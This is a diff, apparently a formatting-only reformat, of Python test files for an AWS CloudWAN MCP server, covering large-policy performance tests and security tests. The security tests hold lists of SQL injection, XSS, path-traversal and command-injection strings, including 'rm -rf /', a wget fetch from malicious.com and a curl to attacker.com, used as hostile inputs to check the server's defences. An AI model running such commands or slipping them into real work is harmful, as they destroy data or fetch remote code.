+            regex_benchmark_policy["attachment-policies"].append(policy)
 
         start_time = time.time()
         result = await validate_cloudwan_policy(regex_benchmark_policy)
@@ -441,7 +440,7 @@
         regex_time = end_time - start_time
         parsed = json.loads(result)
 
-        assert parsed['success'] is True
+        assert parsed["success"] is True
         # With regex compilation, should be relatively fast
         assert regex_time < 60.0, f"Regex compilation benchmark took {regex_time:.2f}s"
 
@@ -451,40 +450,40 @@
         """Test detection of circular references in policy documents."""
         # Create policy with potential circular references
         circular_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            'segments': []
+            "segments": [],
         }
 
         # Create segments that reference each other in a circle
         for i in range(100):
             segment = {
-                'name': f'segment-{i:03d}',
-                'references': [
-                    f'segment-{(i + 1) % 100:03d}',  # References next segment (creates circle)
-                    f'segment-{(i + 50) % 100:03d}'   # Additional reference for complexity
+                "name": f"segment-{i:03d}",
+                "references": [
+                    f"segment-{(i + 1) % 100:03d}",  # References next segment (creates circle)
+                    f"segment-{(i + 50) % 100:03d}",  # Additional reference for complexity
                 ],
-                'dependencies': [
-                    f'segment-{(i - 1) % 100:03d}'    # Dependency on previous (reverse circle)
-                ]
+                "dependencies": [
+                    f"segment-{(i - 1) % 100:03d}"  # Dependency on previous (reverse circle)
+                ],
             }
-            circular_policy['segments'].append(segment)
+            circular_policy["segments"].append(segment)
 
         # Add segment actions that could create circular dependencies
-        circular_policy['segment-actions'] = []
+        circular_policy["segment-actions"] = []
         for i in range(100):
             action = {
-                'action': 'share',
-                'segment': f'segment-{i:03d}',
-                'share-with': [f'segment-{(i + j) % 100:03d}' for j in range(1, 6)],
-                'conditions': {
-                    'requires-segment': f'segment-{(i + 99) % 100:03d}'  # Circular condition
-                }
+                "action": "share",
+                "segment": f"segment-{i:03d}",
+                "share-with": [f"segment-{(i + j) % 100:03d}" for j in range(1, 6)],
+                "conditions": {
+                    "requires-segment": f"segment-{(i + 99) % 100:03d}"  # Circular condition
+                },
             }
-            circular_policy['segment-actions'].append(action)
+            circular_policy["segment-actions"].append(action)
 
         start_time = time.time()
         result = await validate_cloudwan_policy(circular_policy)
@@ -493,7 +492,7 @@
         detection_time = end_time - start_time
         parsed = json.loads(result)
 
-        assert parsed['success'] is True  # Function should succeed
+        assert parsed["success"] is True  # Function should succeed
         # Circular reference detection should complete quickly
         assert detection_time < 30.0, f"Circular reference detection took {detection_time:.2f}s"
 
@@ -508,58 +507,55 @@
         """Test diff analysis between large policy versions."""
         # Create base policy version
         base_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [
-                    {'location': f'us-east-{i}', 'asn': 64512 + i}
-                    for i in range(1, 5)
-                ]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": f"us-east-{i}", "asn": 64512 + i} for i in range(1, 5)],
             },
-            'segments': [
+            "segments": [
                 {
-                    'name': f'base-segment-{i:04d}',
-                    'require-attachment-acceptance': i % 2 == 0,
-                    'allow-filter': [f'10.{i // 256}.{i % 256}.0/24']
+                    "name": f"base-segment-{i:04d}",
+                    "require-attachment-acceptance": i % 2 == 0,
+                    "allow-filter": [f"10.{i // 256}.{i % 256}.0/24"],
                 }
                 for i in range(10000)
-            ]
+            ],
         }
 
         # Create modified policy version with changes
         modified_policy = base_policy.copy()
-        modified_policy['segments'] = []
+        modified_policy["segments"] = []
 
         # Add modified segments (some unchanged, some modified, some new)
         for i in range(12000):  # 2000 additional segments
             if i < 5000:
                 # Keep first 5000 unchanged
                 segment = {
-                    'name': f'base-segment-{i:04d}',
-                    'require-attachment-acceptance': i % 2 == 0,
-                    'allow-filter': [f'10.{i // 256}.{i % 256}.0/24']
+                    "name": f"base-segment-{i:04d}",
+                    "require-attachment-acceptance": i % 2 == 0,
+                    "allow-filter": [f"10.{i // 256}.{i % 256}.0/24"],
                 }
             elif i < 10000:
                 # Modify next 5000
                 segment = {
-                    'name': f'base-segment-{i:04d}',
-                    'require-attachment-acceptance': not (i % 2 == 0),  # Flipped
-                    'allow-filter': [f'10.{i // 256}.{i % 256}.0/24', f'172.16.{i % 256}.0/24'],  # Added filter
-                    'deny-filter': [f'192.168.{i % 256}.0/24']  # New property
+                    "name": f"base-segment-{i:04d}",
+                    "require-attachment-acceptance": not (i % 2 == 0),  # Flipped
+                    "allow-filter": [f"10.{i // 256}.{i % 256}.0/24", f"172.16.{i % 256}.0/24"],  # Added filter
+                    "deny-filter": [f"192.168.{i % 256}.0/24"],  # New property
                 }
             else:
                 # Add 2000 new segments
                 segment = {
-                    'name': f'new-segment-{i:04d}',
-                    'require-attachment-acceptance': False,
-                    'allow-filter': [f'192.168.{i % 256}.0/24']
+                    "name": f"new-segment-{i:04d}",
+                    "require-attachment-acceptance": False,
+                    "allow-filter": [f"192.168.{i % 256}.0/24"],
                 }
 
-            modified_policy['segments'].append(segment)
+            modified_policy["segments"].append(segment)
 
         # Mock policy retrieval for diff analysis
         def mock_policy_retrieval(core_network_id, alias=None):
-            if alias == 'PREVIOUS':
+            if alias == "PREVIOUS":
                 return base_policy
             else:
                 return modified_policy
@@ -580,8 +576,8 @@
         base_parsed = json.loads(base_result)
         modified_parsed = json.loads(modified_result)
 
-        assert base_parsed['success'] is True
-        assert modified_parsed['success'] is True
+        assert base_parsed["success"] is True
+        assert modified_parsed["success"] is True
 
         # Performance requirements for large policy diff
         assert diff_time < 180.0, f"Large policy diff took {diff_time:.2f}s"
@@ -593,43 +589,41 @@
         """Test policy render tree validation performance."""
         # Create policy with complex render dependencies
         render_tree_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            'network-function-groups': []
+            "network-function-groups": [],
         }
 
         # Create hierarchical network function groups
         for level in range(5):  # 5 levels of hierarchy
-            for group_idx in range(10 ** level):  # Exponential growth
+            for group_idx in range(10**level):  # Exponential growth
                 group = {
-                    'name': f'nfg-level-{level}-{group_idx:06d}',
-                    'description': f'Network function group at level {level}',
-                    'require-attachment-acceptance': True,
-                    'policy': {
-                        'traffic-rules': [
+                    "name": f"nfg-level-{level}-{group_idx:06d}",
+                    "description": f"Network function group at level {level}",
+                    "require-attachment-acceptance": True,
+                    "policy": {
+                        "traffic-rules": [
                             {
-                                'rule-number': rule_idx + 1,
-                                'source': f'level-{level}-source-{rule_idx}',
-                                'destination': f'level-{(level + 1) % 5}-dest-{rule_idx}',
-                                'action': 'allow'
+                                "rule-number": rule_idx + 1,
+                                "source": f"level-{level}-source-{rule_idx}",
+                                "destination": f"level-{(level + 1) % 5}-dest-{rule_idx}",
+                                "action": "allow",
                             }
                             for rule_idx in range(50)  # 50 rules per group
                         ]
                     },
-                    'dependencies': [
-                        f'nfg-level-{level - 1}-{group_idx // 10:06d}'
-                    ] if level > 0 else []
+                    "dependencies": [f"nfg-level-{level - 1}-{group_idx // 10:06d}"] if level > 0 else [],
                 }
-                render_tree_policy['network-function-groups'].append(group)
+                render_tree_policy["network-function-groups"].append(group)
 
                 # Limit total groups to prevent excessive test time
-                if len(render_tree_policy['network-function-groups']) >= 1000:
+                if len(render_tree_policy["network-function-groups"]) >= 1000:
                     break
 
-            if len(render_tree_policy['network-function-groups']) >= 1000:
+            if len(render_tree_policy["network-function-groups"]) >= 1000:
                 break
 
         start_time = time.time()
@@ -639,7 +633,7 @@
         render_time = end_time - start_time
         parsed = json.loads(result)
 
-        assert parsed['success'] is True
+        assert parsed["success"] is True
         # Render tree validation should be efficient
         assert render_time < 90.0, f"Render tree validation took {render_time:.2f}s"
 
@@ -654,11 +648,11 @@
         """Test memory-mapped file processing for very large policies."""
         # Simulate processing of a policy too large for memory
         streaming_policy_data = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
-            }
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
+            },
         }
 
         # Create large segment dataset that would benefit from streaming
@@ -668,23 +662,21 @@
             for i in range(1000):  # 1000 segments per batch
                 segment_idx = batch * 1000 + i
                 segment = {
-                    'name': f'streaming-segment-{segment_idx:08d}',
-                    'description': f'Large segment {segment_idx} processed via streaming for memory efficiency optimization testing',
-                    'require-attachment-acceptance': segment_idx % 2 == 0,
-                    'allow-filter': [
-                        f'10.{(segment_idx // 65536) % 256}.{(segment_idx // 256) % 256}.0/24'
-                    ],
-                    'metadata': {
-                        'batch': batch,
-                        'index': i,
-                        'total-index': segment_idx,
-                        'processing-hint': 'memory-efficient-streaming'
-                    }
+                    "name": f"streaming-segment-{segment_idx:08d}",
+                    "description": f"Large segment {segment_idx} processed via streaming for memory efficiency optimization testing",
+                    "require-attachment-acceptance": segment_idx % 2 == 0,
+                    "allow-filter": [f"10.{(segment_idx // 65536) % 256}.{(segment_idx // 256) % 256}.0/24"],
+                    "metadata": {
+                        "batch": batch,
+                        "index": i,
+                        "total-index": segment_idx,
+                        "processing-hint": "memory-efficient-streaming",
+                    },
                 }
                 batch_segments.append(segment)
             large_segments.extend(batch_segments)
 
-        streaming_policy_data['segments'] = large_segments
+        streaming_policy_data["segments"] = large_segments
 
         # Simulate memory-mapped processing
         gc.collect()
@@ -699,14 +691,14 @@
         for chunk_start in range(0, total_segments, chunk_size):
             chunk_end = min(chunk_start + chunk_size, total_segments)
             chunk_policy = {
-                'version': '2021.12',
-                'core-network-configuration': streaming_policy_data['core-network-configuration'],
-                'segments': large_segments[chunk_start:chunk_end]
+                "version": "2021.12",
+                "core-network-configuration": streaming_policy_data["core-network-configuration"],
+                "segments": large_segments[chunk_start:chunk_end],
             }
 
             chunk_result = await validate_cloudwan_policy(chunk_policy)
             chunk_parsed = json.loads(chunk_result)
-            assert chunk_parsed['success'] is True
+            assert chunk_parsed["success"] is True
 
             processed_chunks += 1
 
@@ -730,8 +722,10 @@
         assert streaming_time < 120.0, f"Memory-mapped processing took {streaming_time:.2f}s"
         assert total_memory_growth < 300, f"Total memory growth {total_memory_growth:.1f}MB"
 
-        print(f"Streamed {total_segments} segments in {processed_chunks} chunks, "
-              f"{streaming_time:.2f}s, {total_memory_growth:.1f}MB growth")
+        print(
+            f"Streamed {total_segments} segments in {processed_chunks} chunks, "
+            f"{streaming_time:.2f}s, {total_memory_growth:.1f}MB growth"
+        )
 
 
 class TestPolicyCacheInvalidation:
@@ -743,32 +737,28 @@
         """Test policy cache invalidation scenarios."""
         # Create base policy for caching
         cached_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            'segments': [
-                {
-                    'name': f'cached-segment-{i:04d}',
-                    'require-attachment-acceptance': i % 2 == 0
-                }
-                for i in range(5000)
-            ]
+            "segments": [
+                {"name": f"cached-segment-{i:04d}", "require-attachment-acceptance": i % 2 == 0} for i in range(5000)
+            ],
         }
 
         # Simulate cache scenario
         cache_hit_count = 0
         cache_miss_count = 0
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
 
             def cached_policy_retrieval(**kwargs):
                 nonlocal cache_hit_count, cache_miss_count
 
                 # Simulate cache behavior
-                if hasattr(cached_policy_retrieval, 'call_count'):
+                if hasattr(cached_policy_retrieval, "call_count"):
                     cached_policy_retrieval.call_count += 1
                 else:
                     cached_policy_retrieval.call_count = 1
@@ -781,12 +771,7 @@
                     # Subsequent calls are cache hits
                     cache_hit_count += 1
 
-                return {
-                    'CoreNetworkPolicy': {
-                        'PolicyVersionId': '1',
-                        'PolicyDocument': json.dumps(cached_policy)
-                    }
-                }
+                return {"CoreNetworkPolicy": {"PolicyVersionId": "1", "PolicyDocument": json.dumps(cached_policy)}}
 
             mock_client.get_core_network_policy.side_effect = cached_policy_retrieval
             mock_get_client.return_value = mock_client
@@ -795,9 +780,9 @@
             start_time = time.time()
 
             for i in range(10):
-                result = await get_core_network_policy('core-network-cache-test')
+                result = await get_core_network_policy("core-network-cache-test")
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
             end_time = time.time()
             total_time = end_time - start_time
@@ -818,20 +803,18 @@
 
         for variant_idx in range(20):
             variant_policy = {
-                'version': '2021.12',
-                'core-network-configuration': {
-                    'asn-ranges': [f'{64512 + variant_idx * 10}-{64512 + variant_idx * 10 + 9}'],
-                    'edge-locations': [
-                        {'location': f'us-east-{(variant_idx % 2) + 1}', 'asn': 64512 + variant_idx}
-                    ]
+                "version": "2021.12",
+                "core-network-configuration": {
+                    "asn-ranges": [f"{64512 + variant_idx * 10}-{64512 + variant_idx * 10 + 9}"],
+                    "edge-locations": [{"location": f"us-east-{(variant_idx % 2) + 1}", "asn": 64512 + variant_idx}],
                 },
-                'segments': [
+                "segments": [
                     {
-                        'name': f'variant-{variant_idx:02d}-segment-{i:04d}',
-                        'require-attachment-acceptance': (variant_idx + i) % 2 == 0
+                        "name": f"variant-{variant_idx:02d}-segment-{i:04d}",
+                        "require-attachment-acceptance": (variant_idx + i) % 2 == 0,
                     }
                     for i in range(1000)
-                ]
+                ],
             }
             policy_variants.append(variant_policy)
 
@@ -867,12 +850,13 @@
         # Verify all validations succeeded
         assert len(sequential_results) == 20
         assert len(parallel_results) == 20
-        assert all(result['success'] for result in sequential_results)
-        assert all(result['success'] for result in parallel_results)
+        assert all(result["success"] for result in sequential_results)
+        assert all(result["success"] for result in parallel_results)
 
         # Parallel processing should show some efficiency gains
         efficiency_ratio = sequential_time / parallel_time if parallel_time > 0 else 1
-        print(f"Sequential: {sequential_time:.2f}s, Parallel: {parallel_time:.2f}s, "
-              f"Efficiency: {efficiency_ratio:.2f}x")
+        print(
+            f"Sequential: {sequential_time:.2f}s, Parallel: {parallel_time:.2f}s, Efficiency: {efficiency_ratio:.2f}x"
+        )
 
         assert sequential_time > 0 and parallel_time > 0, "Both methods should take measurable time"

--- cloudwan-mcp-server/tests/integration/test_security_compliance.py
+++ cloudwan-mcp-server/tests/integration/test_security_compliance.py
@@ -40,80 +40,74 @@
         """Test comprehensive IAM access denied scenarios."""
         iam_error_scenarios = [
             {
-                'error_code': 'AccessDenied',
-                'error_message': 'User: arn:aws:iam::123456789012:user/test-user is not authorized to perform: networkmanager:ListCoreNetworks',
-                'function': list_core_networks,
-                'service': 'networkmanager'
+                "error_code": "AccessDenied",
+                "error_message": "User: arn:aws:iam::123456789012:user/test-user is not authorized to perform: networkmanager:ListCoreNetworks",
+                "function": list_core_networks,
+                "service": "networkmanager",
             },
             {
-                'error_code': 'UnauthorizedOperation',
-                'error_message': 'You are not authorized to perform this operation',
-                'function': analyze_tgw_routes,
-                'service': 'ec2',
-                'args': ['tgw-rtb-unauthorized']
+                "error_code": "UnauthorizedOperation",
+                "error_message": "You are not authorized to perform this operation",
+                "function": analyze_tgw_routes,
+                "service": "ec2",
+                "args": ["tgw-rtb-unauthorized"],
             },
             {
-                'error_code': 'TokenRefreshRequired',
-                'error_message': 'The AWS Access Key Id needs a subscription for the service',
-                'function': get_core_network_policy,
-                'service': 'networkmanager',
-                'args': ['core-network-subscription-test']
+                "error_code": "TokenRefreshRequired",
+                "error_message": "The AWS Access Key Id needs a subscription for the service",
+                "function": get_core_network_policy,
+                "service": "networkmanager",
+                "args": ["core-network-subscription-test"],
             },
             {
-                'error_code': 'InvalidUserID.NotFound',
-                'error_message': 'The user ID does not exist',
-                'function': list_core_networks,
-                'service': 'networkmanager'
-            }
+                "error_code": "InvalidUserID.NotFound",
+                "error_message": "The user ID does not exist",
+                "function": list_core_networks,
+                "service": "networkmanager",
+            },
         ]
 
         for scenario in iam_error_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
 
                 # Set up method-specific mocking
-                if scenario['service'] == 'networkmanager':
+                if scenario["service"] == "networkmanager":
                     mock_client.list_core_networks.side_effect = ClientError(
                         {
-                            'Error': {
-                                'Code': scenario['error_code'],
-                                'Message': scenario['error_message']
+                            "Error": {"Code": scenario["error_code"], "Message": scenario["error_message"]},
+                            "ResponseMetadata": {
+                                "RequestId": f"req-{scenario['error_code']}-security-test",
+                                "HTTPStatusCode": 403,
                             },
-                            'ResponseMetadata': {
-                                'RequestId': f"req-{scenario['error_code']}-security-test",
-                                'HTTPStatusCode': 403
-                            }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
                     mock_client.get_core_network_policy.side_effect = mock_client.list_core_networks.side_effect
-                elif scenario['service'] == 'ec2':
+                elif scenario["service"] == "ec2":
                     mock_client.search_transit_gateway_routes.side_effect = ClientError(
                         {
-                            'Error': {
-                                'Code': scenario['error_code'],
-                                'Message': scenario['error_message']
+                            "Error": {"Code": scenario["error_code"], "Message": scenario["error_message"]},
+                            "ResponseMetadata": {
+                                "RequestId": f"req-{scenario['error_code']}-security-test",
+                                "HTTPStatusCode": 403,
                             },
-                            'ResponseMetadata': {
-                                'RequestId': f"req-{scenario['error_code']}-security-test",
-                                'HTTPStatusCode': 403
-                            }
                         },
-                        'SearchTransitGatewayRoutes'
+                        "SearchTransitGatewayRoutes",
                     )
 
                 mock_get_client.return_value = mock_client
 
                 # Execute function with args if provided
-                if 'args' in scenario and scenario['args']:
-                    result = await scenario['function'](*scenario['args'])
+                if "args" in scenario and scenario["args"]:
+                    result = await scenario["function"](*scenario["args"])
                 else:
-                    result = await scenario['function']()
+                    result = await scenario["function"]()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is False
-                assert scenario['error_code'] == parsed['error_code']
-                assert scenario['error_message'] in parsed['error']
+                assert parsed["success"] is False
+                assert scenario["error_code"] == parsed["error_code"]
+                assert scenario["error_message"] in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -122,40 +116,40 @@
         """Test cross-account access permission validation."""
         cross_account_scenarios = [
             {
-                'source_account': '111111111111',
-                'target_account': '222222222222',
-                'resource_arn': 'arn:aws:networkmanager::222222222222:core-network/core-network-cross-account-test',
-                'expected_error': 'AccessDenied'
+                "source_account": "111111111111",
+                "target_account": "222222222222",
+                "resource_arn": "arn:aws:networkmanager::222222222222:core-network/core-network-cross-account-test",
+                "expected_error": "AccessDenied",
             },
             {
-                'source_account': '333333333333',
-                'target_account': '444444444444',
-                'resource_arn': 'arn:aws:ec2:us-east-1:444444444444:transit-gateway-route-table/tgw-rtb-cross-account',
-                'expected_error': 'UnauthorizedOperation'
-            }
+                "source_account": "333333333333",
+                "target_account": "444444444444",
+                "resource_arn": "arn:aws:ec2:us-east-1:444444444444:transit-gateway-route-table/tgw-rtb-cross-account",
+                "expected_error": "UnauthorizedOperation",
+            },
         ]
 
         for scenario in cross_account_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
                     {
-                        'Error': {
-                            'Code': scenario['expected_error'],
-                            'Message': f"Cross-account access to {scenario['resource_arn']} from account {scenario['source_account']} denied"
+                        "Error": {
+                            "Code": scenario["expected_error"],
+                            "Message": f"Cross-account access to {scenario['resource_arn']} from account {scenario['source_account']} denied",
                         },
-                        'ResponseMetadata': {'RequestId': 'cross-account-test', 'HTTPStatusCode': 403}
+                        "ResponseMetadata": {"RequestId": "cross-account-test", "HTTPStatusCode": 403},
                     },
-                    'ListCoreNetworks'
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
                 parsed = json.loads(result)
 
-                assert parsed['success'] is False
-                assert parsed['error_code'] == scenario['expected_error']
-                assert scenario['target_account'] in parsed['error']
+                assert parsed["success"] is False
+                assert parsed["error_code"] == scenario["expected_error"]
+                assert scenario["target_account"] in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -164,41 +158,38 @@
         """Test resource-based policy access validation."""
         resource_policy_tests = [
             {
-                'resource_type': 'core-network',
-                'resource_id': 'core-network-rbp-test',
-                'policy_effect': 'Deny',
-                'principal': 'arn:aws:iam::123456789012:role/UnauthorizedRole'
+                "resource_type": "core-network",
+                "resource_id": "core-network-rbp-test",
+                "policy_effect": "Deny",
+                "principal": "arn:aws:iam::123456789012:role/UnauthorizedRole",
             },
             {
-                'resource_type': 'global-network',
-                'resource_id': 'global-network-rbp-test',
-                'policy_effect': 'Allow',
-                'principal': 'arn:aws:iam::123456789012:role/AuthorizedRole'
-            }
+                "resource_type": "global-network",
+                "resource_id": "global-network-rbp-test",
+                "policy_effect": "Allow",
+                "principal": "arn:aws:iam::123456789012:role/AuthorizedRole",
+            },
         ]
 
         for test_case in resource_policy_tests:
-            expected_success = test_case['policy_effect'] == 'Allow'
+            expected_success = test_case["policy_effect"] == "Allow"
 
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
 
                 if expected_success:
                     mock_client.list_core_networks.return_value = {
-                        'CoreNetworks': [{
-                            'CoreNetworkId': test_case['resource_id'],
-                            'State': 'AVAILABLE'
-                        }]
+                        "CoreNetworks": [{"CoreNetworkId": test_case["resource_id"], "State": "AVAILABLE"}]
                     }
                 else:
                     mock_client.list_core_networks.side_effect = ClientError(
                         {
-                            'Error': {
-                                'Code': 'AccessDenied',
-                                'Message': f"Resource-based policy denies access to {test_case['resource_id']} for principal {test_case['principal']}"
+                            "Error": {
+                                "Code": "AccessDenied",
+                                "Message": f"Resource-based policy denies access to {test_case['resource_id']} for principal {test_case['principal']}",
                             }
                         },
-                        'ListCoreNetworks'
+                        "ListCoreNetworks",
                     )
 
                 mock_get_client.return_value = mock_client
@@ -206,7 +197,7 @@
                 result = await list_core_networks()
                 parsed = json.loads(result)
 
-                assert parsed['success'] == expected_success
+                assert parsed["success"] == expected_success
 
 
 class TestInputSanitizationSecurity:
@@ -223,7 +214,7 @@
             "admin'--",
             "' UNION SELECT * FROM users WHERE ''='",
             "1; INSERT INTO core_networks VALUES ('malicious');",
-            "core-network-test'; DELETE FROM policies; --"
+            "core-network-test'; DELETE FROM policies; --",
         ]
 
         for payload in sql_injection_payloads:
@@ -233,18 +224,18 @@
                 parsed = json.loads(result)
 
                 # Should either handle gracefully or reject the input
-                if not parsed['success']:
+                if not parsed["success"]:
                     # Verify it's rejected for the right reasons (validation, not SQL error)
-                    assert 'SQL' not in parsed.get('error', '').upper()
-                    assert 'DROP' not in parsed.get('error', '').upper()
-                    assert 'DELETE' not in parsed.get('error', '').upper()
+                    assert "SQL" not in parsed.get("error", "").upper()
+                    assert "DROP" not in parsed.get("error", "").upper()
+                    assert "DELETE" not in parsed.get("error", "").upper()
 
             except Exception as e:
                 # Should not expose SQL-related error details
                 error_message = str(e).upper()
-                assert 'SQL' not in error_message
-                assert 'TABLE' not in error_message
-                assert 'DROP' not in error_message
+                assert "SQL" not in error_message
+                assert "TABLE" not in error_message
+                assert "DROP" not in error_message
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -257,19 +248,19 @@
             "<img src=x onerror=alert('xss')>",
             "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
             "<svg onload=alert('xss')>",
-            "expression(alert('xss'))"
+            "expression(alert('xss'))",
         ]
 
         for payload in xss_payloads:
-            result = await validate_ip_cidr('validate_ip', ip=payload)
+            result = await validate_ip_cidr("validate_ip", ip=payload)
             parsed = json.loads(result)
 
             # Should not include unescaped script tags in response
             response_text = json.dumps(parsed)
-            assert '<script' not in response_text
-            assert 'javascript:' not in response_text
-            assert 'onerror=' not in response_text
-            assert 'onload=' not in response_text
+            assert "<script" not in response_text
+            assert "javascript:" not in response_text
+            assert "onerror=" not in response_text
+            assert "onload=" not in response_text
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -284,7 +275,7 @@
             "`id`",
             "; rm -rf /",
             "&& wget malicious.com/script.sh",
-            "|| curl attacker.com"
+            "|| curl attacker.com",
         ]
 
         for payload in command_injection_payloads:
@@ -292,12 +283,12 @@
             parsed = json.loads(result)
 
             # Should handle malicious input gracefully
-            if not parsed['success']:
-                error_msg = parsed.get('error', '').lower()
+            if not parsed["success"]:
+                error_msg = parsed.get("error", "").lower()
                 # Should not execute or reveal system commands
-                assert 'command not found' not in error_msg
-                assert 'permission denied' not in error_msg
-                assert 'no such file' not in error_msg
+                assert "command not found" not in error_msg
+                assert "permission denied" not in error_msg
+                assert "no such file" not in error_msg
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -310,7 +301,7 @@
             "....//....//....//etc//passwd",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "..%252f..%252f..%252fetc%252fpasswd",
-            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
         ]
 
         for payload in path_traversal_payloads:
@@ -318,11 +309,11 @@
             parsed = json.loads(result)
 
             # Should not access files outside intended directory
-            if not parsed['success']:
-                error_msg = parsed.get('error', '').lower()
-                assert '/etc/passwd' not in error_msg
-                assert 'root:x:' not in error_msg
-                assert 'system32' not in error_msg
+            if not parsed["success"]:
+                error_msg = parsed.get("error", "").lower()
+                assert "/etc/passwd" not in error_msg
+                assert "root:x:" not in error_msg
+                assert "system32" not in error_msg
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -331,27 +322,27 @@
         """Test buffer overflow attack prevention."""
         # Generate very long strings to test buffer limits
         long_payloads = [
-            'A' * 1000,      # 1KB
-            'B' * 10000,     # 10KB
-            'C' * 100000,    # 100KB
-            'D' * 1000000,   # 1MB
+            "A" * 1000,  # 1KB
+            "B" * 10000,  # 10KB
+            "C" * 100000,  # 100KB
+            "D" * 1000000,  # 1MB
         ]
 
         for payload in long_payloads:
             try:
-                result = await validate_ip_cidr('validate_ip', ip=payload)
+                result = await validate_ip_cidr("validate_ip", ip=payload)
                 parsed = json.loads(result)
 
                 # Should handle gracefully without crashing
                 assert isinstance(parsed, dict)
-                assert 'success' in parsed
+                assert "success" in parsed
 
             except Exception as e:
                 # Should not crash with memory-related errors
                 error_msg = str(e).lower()
-                assert 'memory' not in error_msg
-                assert 'overflow' not in error_msg
-                assert 'segmentation' not in error_msg
+                assert "memory" not in error_msg
+                assert "overflow" not in error_msg
+                assert "segmentation" not in error_msg
 
 
 class TestPolicyDocumentSecurity:
@@ -364,26 +355,20 @@
         """Test detection of malicious policy structures."""
         malicious_policies = [
             # Policy with excessive nesting (potential DoS)
-            {
-                'version': '2021.12',
-                'core-network-configuration': self._create_deeply_nested_structure(50)
-            },
+            {"version": "2021.12", "core-network-configuration": self._create_deeply_nested_structure(50)},
             # Policy with circular references
             {
-                'version': '2021.12',
-                'segments': [
-                    {'name': 'seg1', 'references': ['seg2']},
-                    {'name': 'seg2', 'references': ['seg1']}
-                ]
+                "version": "2021.12",
+                "segments": [{"name": "seg1", "references": ["seg2"]}, {"name": "seg2", "references": ["seg1"]}],
             },
             # Policy with dangerous evaluation patterns
             {
-                'version': '2021.12',
-                'core-network-configuration': {
-                    'eval': 'os.system("rm -rf /")',
-                    'exec': 'import subprocess; subprocess.run(["ls"])'
-                }
-            }
+                "version": "2021.12",
+                "core-network-configuration": {
+                    "eval": 'os.system("rm -rf /")',
+                    "exec": 'import subprocess; subprocess.run(["ls"])',
+                },
+            },
         ]
 
         for malicious_policy in malicious_policies:
@@ -392,12 +377,12 @@
 
             # Should complete without executing dangerous code
             assert isinstance(parsed, dict)
-            assert 'success' in parsed
+            assert "success" in parsed
 
             # Should not contain evidence of code execution
             response_text = json.dumps(parsed)
-            assert 'subprocess' not in response_text
-            assert 'os.system' not in response_text
+            assert "subprocess" not in response_text
+            assert "os.system" not in response_text
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -405,48 +390,44 @@
     async def test_policy_size_limits(self):
         """Test policy document size limits and DoS prevention."""
         # Create progressively larger policies
-        policy_sizes = [
-            ('1MB', 1024 * 1024),
-            ('5MB', 5 * 1024 * 1024),
-            ('10MB', 10 * 1024 * 1024)
-        ]
+        policy_sizes = [("1MB", 1024 * 1024), ("5MB", 5 * 1024 * 1024), ("10MB", 10 * 1024 * 1024)]
 
         for size_name, target_size in policy_sizes:
             # Create large policy by repeating segments
             large_policy = {
-                'version': '2021.12',
-                'core-network-configuration': {
-                    'asn-ranges': ['64512-64555'],
-                    'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+                "version": "2021.12",
+                "core-network-configuration": {
+                    "asn-ranges": ["64512-64555"],
+                    "edge-locations": [{"location": "us-east-1", "asn": 64512}],
                 },
-                'segments': []
+                "segments": [],
             }
 
             # Add segments until we reach target size
             segment_template = {
-                'name': 'large-segment-{:06d}',
-                'description': 'A' * 1000,  # 1KB description
-                'require-attachment-acceptance': False
